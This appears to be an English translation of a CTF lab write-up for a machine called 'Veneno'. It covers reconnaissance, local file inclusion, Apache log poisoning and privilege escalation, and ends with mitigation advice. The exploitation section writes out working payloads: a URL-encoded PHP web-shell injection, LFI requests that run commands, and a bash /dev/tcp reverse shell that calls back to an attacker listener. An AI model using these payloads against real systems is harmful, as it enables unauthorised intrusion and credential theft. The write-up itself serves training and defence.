# Veneno — Technical Analysis (English Translation)

## Introduction

This laboratory (medium-difficulty CTF) demonstrates an exploitation chain based on Local File Inclusion (LFI) and log poisoning against an Apache web service deployed in a Docker container, and the subsequent privilege escalation techniques.

## Methodology

The assessment followed a standard web pentest workflow: service discovery, web content enumeration, parameter fuzzing, file inclusion verification, exploitation via log injection to achieve code execution, and final enumeration for privilege escalation.

### Initial Reconnaissance

A port scan with Nmap confirmed an HTTP service on port 80 and SSH on port 22:

![alt text](img/Nmap.png)

### Directory Discovery and Parameter Fuzzing

The web service returned the default Apache page. A directory scan with Gobuster revealed `uploads` and `problems.php`:

![alt text](img/gobuster.png)

Parameter fuzzing (FFUF) on `problems.php` identified the `?backdoor=` parameter as an interesting vector. Basic command tests (`id`, `pwd`, `whoami`) changed the page output, indicating that the parameter could reference or include filesystem files:

![alt text](img/ffuf.png)

Further path fuzzing returned accessible system file paths, including `/etc/passwd`:

![alt text](img/ffufDirectories.png)

Reading `/etc/passwd` exposed local accounts of interest such as `ubuntu` and `carlos`:

![alt text](img/etcPasswdHttp.png)

### Exploitation: LFI + Log Poisoning

While SSH brute forcing proved ineffective, log files (`/var/log/apache2/error.log`, `access.log`) contained entries from prior HTTP requests, meaning attacker-controlled data could be present in logs. This allowed a log poisoning approach to inject PHP code inside logged entries and then execute it via the LFI.

An example request that writes PHP code into the logs (URL-encoded):

`http://172.17.0.2/%3c%3fphp%20system($_GET['cmd']);%20%3f%3e.php`

Execution was verified by reading the log through the vulnerable parameter:

`http://172.17.0.2/problems.php?backdoor=../../../../../../../var/log/apache2/error.log&cmd=id`

Once command execution was confirmed, a reverse shell payload was used to connect back to the attacker (listener at port 4444):

`http://172.17.0.2/problems.php?backdoor=/../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%27`

Human-readable payload equivalent:

`bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'`

> Note: Start a listener on the attacker machine first (e.g., `nc -lnvp 4444`).

A shell was obtained as `www-data`:

![alt text](img/NCreverseshell.png)

### Enumeration and Privilege Escalation

From `www-data`, local files and potential credentials were enumerated. Sensitive documents were found, including a file that referenced a long-standing password (mentioned as used for 24 years):

![alt text](img/carlosPasswd.png)

A search for old files uncovered credentials which were then used to SSH into the system as `carlos`:

`find / -type f -mtime +8760 2>/dev/null | head -10`

`ssh carlos@172.17.0.2`

![alt text](img/sshCarlos.png)

Inspecting `carlos`' environment revealed a hidden image `toor.jpg` within a directory listing:

![alt text](img/lsCarlos.png)
![alt text](img/ImgCarlosLs.png)

The image was copied and transferred to the attacker machine for offline analysis:

![alt text](img/CPimgCarlos.png)
![alt text](img/wgetImg.png)

Metadata analysis disclosed hidden credentials in EXIF fields:

![alt text](img/metadataImg.png)

Those credentials were used with `su` to obtain `root` privileges:

![alt text](img/root.png)

## Conclusion

A complete exploitation chain was demonstrated: reconnaissance → discovery → LFI in `problems.php` → log poisoning to achieve command execution → reverse shell as `www-data` → local enumeration and credential recovery → SSH as `carlos` → extraction of credentials from image metadata → escalation to `root`. The impact is critical: full system compromise and exposure of plaintext credentials.

## Mitigation / Recommendations

1. Input validation and whitelisting: Validate and restrict the `backdoor` parameter; prohibit user-controlled input from being used in file inclusion routines.

2. Secure PHP configuration: Disable `allow_url_include`, apply `open_basedir` restrictions, and ensure PHP will not execute untrusted content from log files.

3. Protect logging: Avoid logging unfiltered user input as raw data. Restrict permissions for log files and sanitize logged data to prevent injecting executable code.

4. Credential hygiene: Remove plaintext credentials, enforce strong password policies and rotation, and prefer SSH key-based authentication.

5. System hardening: Limit SSH access, implement brute-force protections (e.g., fail2ban), and apply least-privilege principles.

6. Strip metadata on uploads: Remove EXIF or other embedded metadata in files uploaded by users, or scan uploads for sensitive information.

7. Monitoring and alerting: Add detection for LFI patterns, anomalous log entries, and suspicious file inclusions to catch exploitation attempts early.

---

> This translation preserves the technical commands and payloads to enable replication and mitigation testing in controlled environments.
